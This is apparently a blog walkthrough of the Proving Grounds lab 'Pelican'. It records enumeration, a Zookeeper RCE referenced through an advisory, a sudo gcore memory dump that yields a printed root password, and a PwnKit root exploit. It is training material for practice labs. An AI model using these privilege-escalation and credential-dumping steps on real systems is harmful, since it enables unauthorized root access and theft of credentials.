---
title: Pelican
date: 2026-06-08T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - sudo
  - zookeeper
  - gtfobins
  - pwnkit
  - SUID
  - searchsploit
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Pelican"
---
You may be in a tough time but that setback is simply a setup for a greater comeback.

– Joel Osteen

`nmap 192.168.209.98  -p- -sC -sV -sS --min-rate 5000`

![](Screenshot%202026-07-08%20at%2008.41.12.png)

![](Screenshot%202026-07-08%20at%2008.53.40.png)

Nothing really...

Enum4linux:

![](Screenshot%202026-07-08%20at%2009.11.24.png)

Also nothing...

Zookeeper:  
Anything this old must have and RCE.

https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790

![](Screenshot%202026-07-08%20at%2010.00.13.png)


![](Screenshot%202026-07-08%20at%2010.00.53.png)

![](Screenshot%202026-07-08%20at%2010.47.52.png)

Linpeas:

![](Screenshot%202026-07-08%20at%2010.18.35.png)![](Screenshot%202026-07-08%20at%2010.20.16.png)![](Screenshot%202026-07-08%20at%2010.20.57.png)

`sudo -l`

![](Screenshot%202026-07-08%20at%2010.46.50.png)

https://www.man7.org/linux/man-pages/man1/gcore.1.html

`sudo gcore -a -o pass.txt 24879` 

![](Screenshot%202026-07-08%20at%2010.46.24.png)

`strings pass.txt.2`

![](Screenshot%202026-07-08%20at%2010.44.09.png)

`su`  
`ClogKingpinInning731`

![](Screenshot%202026-07-08%20at%2010.56.09.png)

I also gained root with using the Polkit exploit PwnKit. I also tried but failed with DirtyFrag.

Clone the repo onto your kali machine > move to the victim machine > add privs > execute:  
`https://github.com/ly4k/PwnKit.git`

![](Screenshot%202026-07-08%20at%2011.18.43.png)

![](Screenshot%202026-07-08%20at%2011.14.39.png)

so thats good